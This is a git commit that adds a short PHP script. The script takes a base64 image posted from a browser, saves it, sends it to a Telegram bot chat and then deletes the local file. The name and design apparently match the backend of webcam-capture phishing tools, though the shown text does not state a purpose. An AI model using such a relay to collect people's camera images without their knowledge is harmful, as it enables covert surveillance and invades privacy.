e20b8ac945558ca22788f27635220ea9f5fc83fb
onebarone Industry <142303021+onebarone@users.noreply.github.com>
2025-03-29 10:39:54 +0530

    Create capture.php

---
+++ capture.php
@@ -0,0 +1,33 @@
+<?php
+$data = json_decode(file_get_contents("php://input"));
+$image = $data->image;
+
+if ($image) {
+    $image = str_replace('data:image/png;base64,', '', $image);
+    $image = str_replace(' ', '+', $image);
+    $fileData = base64_decode($image);
+
+    $fileName = "captured_" . time() . ".png";
+    file_put_contents($fileName, $fileData);
+
+    // Send to Telegram
+    $telegramToken = "YOUR_BOT_TOKEN";
+    $chatID = "YOUR_CHAT_ID";
+    $url = "https://api.telegram.org/bot$telegramToken/sendPhoto";
+
+    $postData = [
+        'chat_id' => $chatID,
+        'photo' => new CURLFile($fileName)
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+
+    unlink($fileName); // Delete the file after sending
+}
+?>
